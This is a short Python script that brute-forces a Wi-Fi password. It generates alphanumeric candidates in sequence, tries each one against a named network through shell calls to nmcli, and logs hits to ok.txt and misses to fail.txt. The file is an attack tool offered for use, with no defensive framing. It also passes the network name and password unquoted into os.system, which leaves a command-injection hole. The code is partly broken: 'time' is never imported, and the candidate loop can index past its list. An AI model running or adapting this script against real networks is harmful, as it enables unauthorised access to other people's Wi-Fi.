# import module
import os

def connect(name, password):
    command = "nmcli d wifi connect {} password {}".format(name, password)
    print("command :", command)
    result = os.system(command)
    print("결과 :", result)
    if result == 0:
        fp = open("ok.txt", "w")
        fp.write(password)
        exit(0)
    elif result == 2550:
        print("retry")
        return False
    else:
        fp = open("fail.txt", "a")
        fp.write(password + "\n")

    return True

# input wifi name and password
#name = input("Name of Wi-Fi: ")
#password = input("Password: ")
#password = "0000000000"

#name = "KT_GiGA_D42D"
#password = "00"

name = "radio"
password = "0onor0904"

list1 = list(password)

def increase():
    global list1

    for i in range(0, len(list1) + 1):
        if list1[i] >= 'z':
            for j in range(0, i + 1):
                list1[j] = '0'
            continue
        elif list1[i] == '9':
            list1[i] = 'a'
        else:
            list1[i] = chr(ord(list1[i]) + 1)
        break

    if i == len(list1):
        return False
    return True

while increase():
    password = ''.join(list1)
    print(password)
    while False == connect(name, password):
        print("Retry")
        time.sleep(1)
        continue
